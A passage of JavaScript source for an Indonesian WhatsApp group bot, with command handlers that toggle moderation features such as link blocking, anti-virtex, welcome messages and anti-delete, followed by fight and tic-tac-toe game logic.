fs.writeFileSync('./database/antitagsurya.json', JSON.stringify(antitagsurya))
textImg('Anti tag surya berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'antitag':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAntiTag) return textImg(`Udah aktif`)
antitag.push(from)
fs.writeFileSync('./database/antitag.json', JSON.stringify(antitag))
textImg('Berhasil mengaktifkan fitur anti tag di group ini')
} else if (args[1].toLowerCase() === '0'){
let anu = antitag.indexOf(from)
antitag.splice(anu, 1)
fs.writeFileSync('./database/antitag.json', JSON.stringify(antitag))
textImg('Anti tag berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'antibule':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAntiBule) return textImg(`Udah aktif`)
antibule.push(from)
fs.writeFileSync('./database/antibule.json', JSON.stringify(antibule))
textImg('Berhasil mengaktifkan fitur anti bule di group ini')
} else if (args[1].toLowerCase() === '0'){
let anu = antibule.indexOf(from)
antibule.splice(anu, 1)
fs.writeFileSync('./database/antibule.json', JSON.stringify(antibule))
textImg('Anti bule berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'antivo': case 'antiviewonce':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAntiVO) return textImg(`Udah aktif`)
antiviewonce.push(from)
fs.writeFileSync('./database/antiviewonce.json', JSON.stringify(antiviewonce))
textImg('Berhasil mengaktifkan fitur anti view once di group ini')
} else if (args[1].toLowerCase() === '0'){
let anu = antiviewonce.indexOf(from)
antiviewonce.splice(anu, 1)
fs.writeFileSync('./database/antiviewonce.json', JSON.stringify(antiviewonce))
textImg('Anti view once berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'antilinkyoutube': case 'antilinkyt': 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return textImg(mess.OnlyBan)
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAntiLinkYoutube) return textImg(`Udah aktif`)
antilinkyoutube.push(from)
fs.writeFileSync('./database/antilinkyoutube.json', JSON.stringify(antilinkyoutube))
textImg('Berhasil mengaktifkan fitur anti link youtube di group ini')
textImg(`*Note :*\n\n*Jangan kirim link YouTube atau kamu akan saya kick!*`)
} else if (args[1].toLowerCase() === '0'){
let anu = antilinkyoutube.indexOf(from)
antilinkyoutube.splice(anu, 1)
fs.writeFileSync('./database/antilinkyoutube.json', JSON.stringify(antilinkyoutube))
textImg('Anti link youTube berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'antilinkfacebook': case 'antilinkfb':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAntiLinkFacebook) return textImg(`Udah aktif`)
antilinkfacebook.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(antilinkfacebook))
textImg('Berhasil mengaktifkan fitur anti link facebook di group ini')
textImg(`*Note :*\n\n*Jangan kirim Link Facebook atau kamu akan saya kick!*`)
} else if (args[1].toLowerCase() === '0'){
let anu = antilinkfacebook.indexOf(from)
antilinkfacebook.splice(anu, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(antilinkfacebook))
textImg('Anti link facebook berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'antilinkinstagram': case 'antilinkig':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAntiLinkInstagram) return textImg(`Udah aktif`)
antilinkinstagram.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(antilinkinstagram))
textImg('Berhasil mengaktifkan fitur anti link Instagram di group ini')
textImg(`*Note :*\n\n*Jangan kirim Link Instagram atau kamu akan saya kick!*`)
} else if (args[1].toLowerCase() === '0'){
let anu = antilinkinstagram.indexOf(from)
antilinkinstagram.splice(anu, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(antilinkinstagram))
textImg('Anti link instagram berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'antilinktelegram': case 'antilinktele':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAntiLinktelegram) return textImg(`Udah aktif`)
antilinktelegram.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(antilinktelegram))
textImg('Berhasil mengaktifkan fitur anti link telegram di group ini')
textImg(`*Note :*\n\n*Jangan kirim Link Telegram atau kamu akan saya kick!*`)
} else if (args[1].toLowerCase() === '0'){
let anu = antilinktelegram.indexOf(from)
antilinktelegram.splice(anu, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(antilinktelegram))
textImg('Anti link telegram berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'antilinktiktok': case 'antilinktt':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAntiLinkTiktok) return textImg(`Udah aktif`)
antilinktiktok.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(antilinktiktok))
textImg('Berhasil mengaktifkan fitur anti link tiktok di group ini')
textImg(`*Note :*\n\n*Jangan kirim Link TikTok atau kamu akan saya kick!*`)
} else if (args[1].toLowerCase() === '0'){
let anu = antilinktiktok.indexOf(from)
antilinktiktok.splice(anu, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(antilinktiktok))
textImg('Anti link tiktok berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'antivirtex':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAntiVirtex) return textImg(`Udah aktif`)
antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
textImg('Berhasil mengaktifkan fitur anti virtex di group ini')
textImg(`*Note :*\n\n*Jangan kirim Virtex atau kamu akan saya kick!*`)
} else if (args[1].toLowerCase() === '0'){
let anu = antivirtex.indexOf(from)
antivirtex.splice(anu, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
textImg('Anti virtex berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'autovideo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAutoVideo) return textImg(`Udah aktif`)
autovideo.push(from)
fs.writeFileSync('./database/autovideo.json', JSON.stringify(autovideo))
textImg('Berhasil mengaktifkan fitur auto video di group ini*')
} else if (args[1].toLowerCase() === '0'){
let anu = autovideo.indexOf(from)
autovideo.splice(anu, 1)
fs.writeFileSync('./database/autovideo.json', JSON.stringify(autovideo))
textImg('Auto video berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'welcome':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isWelcome) return textImg(`Udah aktif`)
welcome.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
textImg('Berhasil mengaktifkan fitur welcome di group ini')
} else if (args[1].toLowerCase() === '0'){
let anu = welcome.indexOf(from)
welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
textImg('Welcome berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'left':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isLeft) return textImg(`Udah aktif`)
left.push(from)
fs.writeFileSync('./database/left.json', JSON.stringify(left))
textImg('Berhasil mengaktifkan fitur left di group ini')
} else if (args[1].toLowerCase() === '0'){
let anu = left.indexOf(from)
left.splice(anu, 1)
fs.writeFileSync('./database/left.json', JSON.stringify(left))
textImg('Left berhasil di nonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'antiwame': case 'antilinkwa':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan
Contoh : ${prefix}antilinkwa 1`)
if (args[1].toLowerCase() === '1'){
if (isAntiWame) return textImg(`Udah aktif`)
antiwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
textImg('Berhasil mengaktifkan fitur anti link wa di group ini')
textImg(`*Note :*\n\n*Jangan kirim Link WhatsApp atau kamu akan saya kick!*`)
} else if (args[1].toLowerCase() === '0'){
let anu = antiwame.indexOf(from)
antiwame.splice(anu, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
textImg('Berhasil menonaktifkan fitur anti link wa di group ini')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan
Contoh : ${prefix}antiwame 1`)
}
break
case 'simih':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (args.length === 1) return reply(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isSimih) return reply(`Udah aktif`)
simih.push(from)
fs.writeFileSync('./database/simih.json', JSON.stringify(simih))
textImg('Berhasil mengaktifkan fitur simih di chat ini')
} else if (args[1].toLowerCase() === '0'){
let anu = simih.indexOf(from)
simih.splice(anu, 1)
fs.writeFileSync('./database/simih.json', JSON.stringify(simih))
textImg('Berhasil menonaktifkan fitur simih di chat ini')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
gameAdd(sender, glimit)
}
break
case 'psholat':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isSholat) return textImg(`Udah aktif`)
psholat.push(from)
fs.writeFileSync('./database/sholat.json', JSON.stringify(psholat))
textImg('Berhasil mengaktifkan fitur pengingat sholat di group ini')
} else if (args[1].toLowerCase() === '0'){
let anu = psholat.indexOf(from)
psholat.splice(anu, 1)
fs.writeFileSync('./database/sholat.json', JSON.stringify(psholat))
textImg('Berhasil menonaktifkan fitur pengingat sholat di group ini')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
gameAdd(sender, glimit)
}
break
case 'autojoin':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (!isGroupAdmins && !fromMe && !isOwner2 && !isOwner) return textImg(mess.GrupAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAutoJoin) return textImg(`Udah aktif`)
autojoin.push(from)
fs.writeFileSync('./database/autojoin.json', JSON.stringify(autojoin))
textImg('Berhasil mengaktifkan fitur auto join di group ini')
} else if (args[1].toLowerCase() === '0'){
let anu = autojoin.indexOf(from)
autojoin.splice(anu, 1)
fs.writeFileSync('./database/autojoin.json', JSON.stringify(autojoin))
textImg('Berhasil menonaktifkan fitur auto join di group ini')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
gameAdd(sender, glimit)
}
break
case 'autoimage':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAutoImage) return textImg(`Udah aktif`)
autoimage.push(from)
fs.writeFileSync('./database/autoimage.json', JSON.stringify(autoimage))
textImg('Berhasil mengaktifkan fitur auto image di group ini')
} else if (args[1].toLowerCase() === '0'){
let anu = autoimage.indexOf(from)
autoimage.splice(anu, 1)
fs.writeFileSync('./database/autoimage.json', JSON.stringify(autoimage))
textImg('Berhasil menonaktifkan fitur auto image di group ini')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break

case 'leveling':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !fromMe && !isOwner2 && !isOwner) return reply(mess.GrupAdmin)
if (args.length === 1) return reply(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isLevelingOn) return reply(`Udah aktif`)
_leveling.push(from)
fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
reply('leveling aktif')
} else if (args[1].toLowerCase() === '0'){
let anu = _leveling.indexOf(from)
_leveling.splice(anu, 1)
fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
reply('leveling nonaktif')
} else {
textImg(from, `leveling`)
}
break
case 'event':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length === 1) return reply(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isMiningOn) return reply(`Udah aktif`)
mining.push(from)
fs.writeFileSync('./database/mining.json', JSON.stringify(mining))
reply('Fitur mining berhasil diaktifkan')
} else if (args[1].toLowerCase() === '0'){
let anu = mining.indexOf(from)
mining.splice(anu, 1)
fs.writeFileSync('./database/mining.json', JSON.stringify(mining))
reply('Fitur mining berhasil dinonaktifkan')
} else {
textImg(`Pilih 1 untuk mengaktifkan dan 0 untuk menonaktifkan`)
}
break
case 'nsfw':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !fromMe) return reply(mess.GrupAdmin)
if (args.length === 1) return reply(`Pilih 1 atau 0\nContoh : ${prefix}nsfw 1`)
if (args[1].toLowerCase() === '1'){
if (isNsfw) return reply(`Udah aktif`)
nsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(nsfw))
reply(`${S}Nsfw berhasil diaktifkan${S}`)
} else if (args[1].toLowerCase() === '0'){
let anu = nsfw.indexOf(from)
nsfw.splice(anu, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(nsfw))
reply(`${S}Nsfw berhasil nonaktif${S}`)
} else {
reply(`Pilih 1 atau 0\nContoh : ${prefix}nsfw 1`)
}
break

case 'antihapus':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
//if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length === 1) return reply(`Pilih 1 atau 0\nContoh : ${prefix}antihapus 1`)
if (args[1].toLowerCase() === '1'){
if (isAntiHapus) return reply(`Udah aktif`)
antihapus.push(from)
fs.writeFileSync('./database/antidelete.json', JSON.stringify(antihapus))
reply(`*Sukses mengaktifkan fitur antidelete dichat ini*`)
} else if (args[1].toLowerCase() === '0'){
let anu = antihapus.indexOf(from)
antihapus.splice(anu, 1)
fs.writeFileSync('./database/antidelete.json', JSON.stringify(antihapus))
reply(`*Sukses menonaktifkan fitur antidelete dichat ini*`)
} else {
reply(`Pilih 1 atau 0\nContoh : ${prefix}antihapus 1`)
}
break

default:
}
if (fs.existsSync(`./media/${from}.json`)) {
	let gelutSkuy = setGelud(`${from}`)
	if (budy.startsWith('Y')){
		if (gelutSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		gelutSkuy.status = true
		let rand0m = [ gelutSkuy.Z, gelutSkuy.Y ]
		let winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
		let starGame = `👑 Gelud Game

Diantara @${gelutSkuy.Z.split('@')[0]} & @${gelutSkuy.Y.split('@')[0]}
• Pemenangnya adalah [ @${winR.split('@')[0]} ] `
	   surya.sendMessage(from, starGame, text, {quoted: ftroli, contextInfo: { mentionedJid: [winR + '@s.whatsapp.net', gelutSkuy.Z + '@s.whatsapp.net', gelutSkuy.Y + '@s.whatsapp.net']}})
		fs.unlinkSync("./media/" + from + ".json");
	if (budy.startsWith('T')){
		surya.sendMessage(from, `👑 Game Gelud Rejected
• @${gelutSkuy.Y} Menolak:)`, text, {quoted: ftroli, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./media/" + from + ".json");
}
}
}
if (isTTT && iser2){
if (budy.startsWith('Y')){
var tto = ky_ttt.filter(ghg => ghg.id.includes(from))
var tty = tto[0]
var angka = tto[0].angka
var ucapan = `*Game Tictactoe*

@${tty.er1.split('@')[0]} = ❎
@${tty.er2.split('@')[0]} = ⭕

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}

Giliran @${tty.er1.split('@')[0]}`
surya.sendMessage(from, ucapan, text, {thumbnail: suryaImg, sendEphemeral: true, quoted:msg, contextInfo : {mentionedJid: [tty.er1, tty.er2], forwardingScore: 508, isForwarded: true}})
}
if (budy.startsWith('T')){
var tto = ky_ttt.filter(ghg => ghg.id.includes(from))
var tty = tto[0]
var naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
surya.sendMessage(from, `Yahh @${tty.er2.split('@')[0]} Menolak:)`, text, {thumbnail: suryaImg, sendEphemeral: true, quoted:msg, contextInfo : {mentionedJid: [tty.er2], forwardingScore: 508, isForwarded: true}})
}
}

if (isTTT && iser1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Nomor tersebut telah di isi')
if (main[0].gilir.includes(sender)) return reply('Tunggu giliran kamu!')
var s = '❎'
main[0].angka[nuber] = s
main[0].gilir = main[0].er1
var naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
var pop = main[0]
ky_ttt.push(pop)
var tto = ky_ttt.filter(hgh => hgh.id.includes(from))
var tty = tto[0]
var angka = tto[0].angka
var ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
var ucapan1 = `*Game Tictactoe*

*Hasil Akhir :*
${ttt}

Permainan Di Menangkan Oleh @${tty.er1.split('@')[0]}
Hadiah : $${hadiah} balance`
addBalance(tty.er1, hadiah, balance)
getWins(tty.er1, 1)
getLose(tty.er2, 1)
surya.sendMessage(from, ucapan1, text, {thumbnail: suryaImg, sendEphemeral: true, quoted:msg, contextInfo : {mentionedJid: [tty.er1], forwardingScore: 508, isForwarded: true}})
var naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && 
!ttt.includes('4️⃣') && !ttt.includes('5️⃣') && !ttt.includes('6️⃣') && 
!ttt.includes('7️⃣') && !ttt.includes('8️⃣') && !ttt.includes('9️⃣')){
var ucapan1 = `*Game Tictactoe*

*Hasil Akhir :*
${ttt}

Permainan seri`
reply(ucapan1)
var naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
var ucapan = `*Game Tictactoe*

@${tty.er2.split('@')[0]} = ⭕
@${tty.er1.split('@')[0]} = ❎

${ttt}
Giliran @${tty.er2.split('@')[0]}

_∅ Pesan ini akan terhapus otomatis dalam 30 detik_`
let tt1 = await surya.sendMessage(from, ucapan, text, {thumbnail: suryaImg, sendEphemeral: true, quoted:msg, contextInfo : {mentionedJid: [tty.er1, tty.er2], forwardingScore: 508, isForwarded: true}})
setTimeout(() => {
surya.deleteMessage(Suryaa, tt1.key)
},30000)
}
if (isTTT && iser2){
let nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
let main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Nomor tersebut telah di isi')
if (main[0].gilir.includes(sender)) return reply('Tunggu giliran kamu!')
var s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].er2
var naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
var pop = main[0]
ky_ttt.push(pop)
var tto = ky_ttt.filter(hgh => hgh.id.includes(from))
var tty = tto[0]
var angka = tto[0].angka
let ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
let ucapan1 = `*Game Tictactoe*

*Hasil Akhir :*
${ttt}

Permainan Di Menangkan Oleh *@${tty.er2.split('@')[0]}*
hadiah : $${hadiah} balance`
addBalance(tty.er2, hadiah, balance)
getWins(tty.er2, 1)
getLose(tty.er1, 1)
